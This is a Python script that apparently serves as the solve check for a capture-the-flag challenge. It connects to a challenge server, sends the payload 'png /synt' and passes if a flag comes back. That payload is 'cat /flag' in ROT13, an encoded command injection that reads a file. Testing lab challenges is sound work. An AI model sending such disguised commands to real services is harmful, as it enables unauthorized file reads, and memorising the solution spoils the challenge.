import os
import socket
import sys
import time

HOST = os.environ["HOST"]
PORT = int(os.environ["PORT"])

TICKET = None if "TICKET" not in os.environ else os.environ["TICKET"]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

if TICKET is not None:
    sock.recv(len("Ticket please: "))
    sock.sendall((TICKET + "\n").encode("utf-8"))

time.sleep(1)

sock.recv(len("Hello challenger, enter your payload below:\n"))
sock.sendall("png /synt\n".encode("utf-8"))

output = sock.recv(1024)
print(output)

if "flag{" in output.decode("utf-8"):
    print("PASS")
    sys.exit(0)
else:
    print("FAIL")
    sys.exit(1)
